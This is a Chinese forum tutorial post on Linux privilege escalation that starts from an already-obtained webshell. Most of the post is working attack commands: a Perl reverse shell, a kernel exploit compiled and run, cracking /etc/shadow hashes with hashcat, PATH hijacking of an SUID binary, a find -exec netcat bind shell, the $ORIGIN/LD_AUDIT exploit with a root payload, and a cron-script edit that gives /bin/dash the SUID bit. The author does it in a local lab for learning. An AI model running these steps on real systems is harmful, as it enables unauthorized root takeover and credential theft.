> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1498104-1-1.html)

> [md]# 前言 > - Linux 提权方法，环境是你已经拿到了一个 linux 的 webshell# Linux 15.04 提权首先用 (https://github.com/pentestmonkey/pe......

 ![](https://avatar.52pojie.cn/data/avatar/001/63/96/37_avatar_middle.jpg) 孤樱懶契

前言
==

> *   Linux 提权方法，环境是你已经拿到了一个 linux 的 webshell

Linux 15.04 提权
==============

首先用 [perl-reverse-shell.pl](https://github.com/pentestmonkey/perl-reverse-shell) 来反弹 shell 到本地，由于是本地测试，所以 ip 就填自己本地的 ip，接着本地 nc -vvlp 1234，shell 中执行下面命令，windows 中就得到一个 shell 了

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210820213833181.png)
> 
> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210820213904244.png)

信息收集
----

```
查看发行版
cat /etc/issue
cat /etc/*release

查看内核版本
uname -a

```

### 查找可用的提权 exp

```
内核：Linux moonteam-virtual-machine 3.19.0-15-generic #15-Ubuntu SMP Thu Apr 16 23:32:37 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux

```

> [https://www.exploit-db.com/](https://www.exploit-db.com/)

通过内核可以查到可利用的 exp

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210820214756808.png)

将其保存为 15.04.c

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210820215055935.png)

提权
--

用 gcc 15.04.c -o exp

然后在 webshell 中运行提权成功！

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210820215910369.png)

由于这个窗口不好用，所以切换一下 shell

```
python -c 'import pty;pty.spawn("/bin/bash")'

形成
root@mvirtur-virtual-machine:/var/www/html/upload#

```

**可以直接访问 / etc/shadow 查看密文了**

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210820221241320.png)

这时，问题来了，我们知道了密文该如何解密呢

hashcat 解密利用
------------

当前的 Linux 系统出于安全性考虑，etc/passwd 文件中并没有存储 Linux 用户的密码信息，而是转移到了 / etc/shadow 文件下，又称为 “影子文件”。该文件只有 root 用户才能 read 权限，其他用户无权查看，使密码泄露风险降低。同时 shadow 文件中存储的密码采用 SHA512 散列加密，相比较原始的 MD5，加密等级更高。

shadow 文件密码存储格式：`$id$salt$encrypted$`

**_id 代表使用的加密算法：_**

<table><thead><tr><th>id</th><th>Method</th></tr></thead><tbody><tr><td>1</td><td>MD5</td></tr><tr><td>2a</td><td>Blowfish(not in mainline glibc;added in some Linux distribution)</td></tr><tr><td>5</td><td>SHA-256(since glibc 2.7)</td></tr><tr><td>6</td><td>SHA-512(since glibc 2.7)</td></tr></tbody></table>

**_salt 是长度 1-16 字符的随机数，随机数的引入增大了破解难度 \_**

**_encrypted 是最终的密文，即通过加密算法和 salt（盐参）计算的最终结果 \_**

实例：

```
$6$JmlEMUxK$1z4jAyPW9M10W4c6T79ly1yO38S9dXWLdj.gflDVsqj4DkhBTMBjLd8u7q5GD4B.SXa4smGrsXZxwJtPNHfRe0

```

解析：该 shadow 文件显示，使用加密算法为 SHA-512，随机数（salt）为 PUehV6sk，加密密钥为 Y1ctlOYUyKJMO868w7C78xeCvkGz4R7M73Hs6cg.IsMSN.2QryqCbbno5wvklwHn4is//ibMQA0TIWiledmp80

**Hashcat 工具的使用可以去看我的相关文章，这里只介绍命令**

参数标准语句：

```
hashcat  -a 0 -m <加密模式> <shadow文本.txt> <密码文本.txt> -o 输出文本.txt

```

这里由于我已知道密码有几位，所以采用掩码形式

<table><thead><tr><th>3800</th><th>md5($salt.$pass.$salt)</th></tr></thead><tbody><tr><td>3710</td><td>md5($salt.md5($pass))</td></tr><tr><td>4010</td><td>md5($salt.md5($salt.$pass))</td></tr><tr><td>1800</td><td>sha512crypt $6$, SHA512 (Unix)</td></tr></tbody></table>

操作步骤

1、将 shadow.txt 中放于密文

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821075746124.png)

**2、命令执行**

```
hashcat -a 3 -m 1800 shadow.txt --increment --increment-min 5 --increment-max 6 ?d?d?d?d?d?d

```

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821080443790.png)

如果想要他输出的话加一个命令

```
hashcat -a 3 -m 1800 shadow.txt --increment --increment-min 5 --increment-max 6 ?d?d?d?d?d?d -o result.txt

```

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821080559453.png)

Linux SUID 提权
=============

首先演示一遍，假设 root 用户创建了一个 suid.c 文件为以下代码

```
#include<stdlib.h>
#include<unistd.h>
int main()
{
setuid(0);//run as root
system("id");
system("cat /etc/shadow");
}

```

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821094758885.png)

接着 gcc 编译一下`gcc suid.c -o suid-exp`，然后给它一个 suid 的文件属性`chmod 4777 suid-exp`

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821095032678.png)

接着运行一下看看结果，发现可以运行 / etc/shadow 文件

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821095056561.png)

接着进入普通用户开始实战，普通用户无法访问 shadow

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821095145462.png)

但是可以执行刚刚 root 用户创建的 suid-exp 文件`./suid-exp`

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821095218753.png)

所以就可以想着劫持这个 cat 命令来执行 / bin/bash，不过像 suid 这种文件可以利用 find 找出来全部

```
find / -perm -u=s -type f 2>/dev/null

```

> **![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821095414249.png)**

### 劫持环境变量提权

因为 System 函数是继承环境变量，可以通过替换环境变量达到执行任意命令。

在当前 / tep 中创建一个文件

```
echo "/bin/bash" > cat && chmod 777 cat

```

当前目录中的 cat 它会执行一个 shell

查看当前环境变量`echo $PATH`

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821100017254.png)

接着将 tmp 目录增加到环境变量

```
export PATH=.:$PATH

```

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821100512143.png)

接着执行 / tmp/suid-exp，就成功劫持为 root 权限

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821100709750.png)

在说一个 find，假如 find 也被设置了 suid，我们可以利用 find 提权，首先看看是否存在 find

```
touch sky
find sky -exec whoami \;

```

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821104757553.png)

前提是有 nc，发现是 root 权限，接着将这个 shell 打开

```
find sky -exec netcat -lvp 5555 -e /bin/sh \;

```

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821111906458.png)

结果 nc 版本太低，没有 - e 这个命令无法传递 shell，没办法，那就下一个版本高的 nc 吧，开整

**1、wget 下一个 tar 压缩的 nc**

```
wget  http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download -O netcat-0.7.1.tar.gz 

```

**2、解压文件**

```
tar zxvf netcat-0.7.1.tar.gz 

```

**3、解压完毕会生成目录**

```
cd netcat-0.7.1

```

**4、配置环境**

```
./configure

```

**5、配置完了再编译**

```
make

```

6、编译成功生成了 netcat 可执行文件，位与 src 目录，cd 进去然后运行，成功升级到一个版本有 - e 命令的情况

```
./netcat

```

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821113300025.png)

接着我们回到刚刚那个步骤，这回命令得加./netcat，成功反弹了一个 root 权限的用户

```
find sky -exec ./netcat -lvp 5555 -e /bin/sh \;

```

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821114225235.png)

其他文件的提权方法可以看看 [suid 提权](https://www.anquanke.com/post/id/86979)，我觉得 suid 提权主要是做后门吧。

$ORIGIN 溢出提权
============

利用 tmp 目录权限、suid 权限和 C 语言使普通账号提前为 ROOT 权限，适用范围 RHEL5-6，CENTOS5-6

提权方法
----

**1、进入 tmp 目录，创建一个利用目录**

```
mkdir /tmp/exploit

```

**2、将 / bin/ping 和 /tmp/exploit/target 建立链接**

```
ln /bin/ping /tmp/exploit/target

```

**3、将其加载到内存中**

```
exec 3< /tmp/exploit/target
接着可以查看他已经在内存中
ls -l /proc/$$/fd/3

lr-x------ 1 test test 64 08-21 23:05 /proc/3685/fd/3 -> /tmp/exploit/target


```

**4、接着删除我们刚刚创建的文件**

```
rm -rf /tmp/exploit
他会依旧存在内存中
ls -l /proc/$$/fd/3

lr-x------ 1 test test 64 08-21 23:05 /proc/3685/fd/3 -> /tmp/exploit/target (deleted)

```

**4、接着创建一个 payload.c**

```
void __attribute__((constructor)) init()
{
   setuid(0);
   system("/bin/bash");
}

```

然后再 gcc 编译

```
gcc -w -fPIC -shared -o /tmp/exploit payload.c

接着exploit目录只能够会存在这样的东西
ls -l /tmp/exploit

-rwxrwxr-x 1 test test 4223 08-21 23:08 /tmp/exploit


```

**5、提权执行下面命令, 成功 root 权限**

```
LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3

```

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821151049263.png)

Linux CRON JOBS 提权
==================

Cron jobs 计划任务，通过 / etc/crontab 文件，可以设定系统定期执行的任务

crontab 文件只能是 root 权限 进行编辑

当我们得到一个非 root 权限的远程登录用户的时候  
**查看 etc/crontab 内容文件，发现存在一个 py 脚本计划**

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821160816123.png)

查看脚本内容，发现会删除 cleanup 目录里所有文件，根据计划是每隔两分钟一次

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821160924089.png)

**接着很简单了，想要提权就直接给 / bin/dash 设置 suid 权限，运行之后就会得到 root 权限**

```
将os.system('rm -r /home/moonteam/cleanup/*')替换成下面代码

os.system('chmod u+s /bin/dash')

```

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821162128673.png)

接着再过两分钟，就可以执行 / bin/dash 命令来提权到 root 了，因为给 / bin/dash 加了 suid 权限

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821162554072.png)

直接运行 dash，就是 root 权限了

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210821162612344.png)

我的个人博客
======

> 孤桜懶契：[http://gylq.gitee.io](http://gylq.gitee.io)
> -------------------------------------------------![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)jyboyabc 感谢楼主分享实用教程 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) hhjsasa 感谢分享 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) aud 感谢分享宝贵经验 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) rapol0 谢谢分享，学习了 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) Tamluo 谢谢分享，学习了  
![](https://static.52pojie.cn/static/image/smiley/laohu/laohu13.gif)![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)zhxf945 向大神学习，你辛苦了 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) zwtstc 学习了，感谢分享 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) dawangg 感谢分享